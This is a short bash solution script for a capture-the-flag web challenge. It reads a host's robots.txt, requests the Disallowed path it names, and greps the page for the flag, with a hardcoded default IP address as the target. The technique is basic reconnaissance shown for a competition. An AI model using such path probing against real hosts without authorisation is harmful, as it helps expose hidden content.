#!/usr/bin/env bash
# solve-web1-robots.sh — riffhack web1 (robots.txt courtesy)
#
# The /robots.txt file lists `/operator-cache-drop` as a Disallow. That's a
# crawler hint, not access control — fetch the URL directly and the flag is
# in the SSR HTML in a plain <p> tag.
#
# Usage: solve-web1-robots.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
echo "[*] web1 (robots.txt) against $HOST"

echo "[*] GET /robots.txt:"
curl -sk "http://$HOST/robots.txt"

echo "[*] Following the Disallow path:"
flag=$(curl -sk "http://$HOST/operator-cache-drop" | grep -oE 'bitflag\{[^}]+\}' | head -1)

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] no flag found" >&2
  exit 1
fi
